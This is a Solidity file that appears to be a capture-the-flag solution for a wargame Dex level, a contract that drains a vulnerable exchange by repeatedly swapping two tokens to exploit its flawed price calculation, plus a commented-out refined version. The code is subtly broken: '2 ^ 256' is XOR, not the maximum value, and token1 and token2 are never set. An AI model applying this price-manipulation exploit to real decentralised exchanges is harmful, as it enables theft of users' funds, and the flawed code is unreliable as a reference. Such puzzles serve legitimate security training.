// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./22-dex.sol";

contract Attack22 {
    Dex _target;
    address public token1;
    address public token2;
    
    constructor(address _targetAddress) {
        _target = Dex(_targetAddress);
        _target.approve(address(_target), 2 ^ 256); // approve max amount
    }

    function attack() public {
        address from = token1;
        address to = token2;

        for(uint i = 0; i < 5; i++) {
            if (from == token1) {
            from = token2;
            }
            else {
                from = token1;
            }
            if (to == token1) {
                to = token2;
            }
            else {
                to = token1;
            }
        // the swap amount that the player wants to swap
        uint256 amount = _target.balanceOf(from, address(this));
        // how much you actually receive (which is more than amount)
        uint256 amountReceived = _target.getSwapPrice(from, to, amount);

        _target.swap(from, to, amount);
        }   
    }
    receive() external payable {}
}


/*
    from = (from == token1) ? token2 : token1;
    to = (to == token1) ? token2 : token1;

    // how much we want to swap of token from (our entire balance, except for last iteration)
    uint256 amount = _target.balanceOf(from, address(this));

    // how much we will receive from the to token
    uint256 amountReceived = _target.getSwapPrice(from, to, amount);
    
    // for the last iteration, if we swap our entire balance of token from the swap will revert 
    // since the _target doesn't have enough of token to we need to determine how much to send to 
    // empty the other token balance
    
    if (amountReceived > 110) {
        amount = (amount * 110) / amountReceived; // swap amount to get the whole balance of the other token
    }
    
    _target.swap(from, to, amount);
*/